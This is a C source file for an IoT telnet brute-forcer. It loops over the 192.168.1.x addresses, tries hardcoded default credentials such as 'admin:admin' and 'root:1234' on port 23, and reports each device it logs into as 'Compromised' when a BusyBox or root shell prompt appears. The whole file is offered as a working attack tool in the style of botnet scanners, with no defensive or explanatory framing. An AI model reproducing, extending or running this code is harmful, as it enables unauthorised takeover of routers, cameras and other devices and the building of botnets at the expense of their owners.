#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "utils.h"

const char *creds[] = {"admin:admin", "root:1234", "user:password", NULL};

int try_telnet_login(const char *ip, int port, const char *cred) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&target, sizeof(target)) < 0) {
        close(sock);
        return 0;
    }
    
    char *user = strtok(strdup(cred), ":");
    char *pass = strtok(NULL, ":");
    char buffer[1024];
    
    recv(sock, buffer, sizeof(buffer), 0);
    send(sock, user, strlen(user), 0);
    send(sock, "\n", 1, 0);
    recv(sock, buffer, sizeof(buffer), 0);
    send(sock, pass, strlen(pass), 0);
    send(sock, "\n", 1, 0);
    
    sleep(1);
    int bytes = recv(sock, buffer, sizeof(buffer)-1, 0);
    buffer[bytes] = '\0';
    
    if (strstr(buffer, "busybox") || strstr(buffer, "#")) {
        log_success(ip, cred);
        close(sock);
        return 1;
    }
    
    close(sock);
    return 0;
}

void scan_iot_devices() {
    char ip[16];
    for (int i = 1; i < 255; i++) {
        snprintf(ip, sizeof(ip), "192.168.1.%d", i);
        for (int j = 0; creds[j]; j++) {
            if (try_telnet_login(ip, 23, creds[j])) {
                printf("[+] Compromised: %s with %s\n", ip, creds[j]);
            }
        }
    }
}
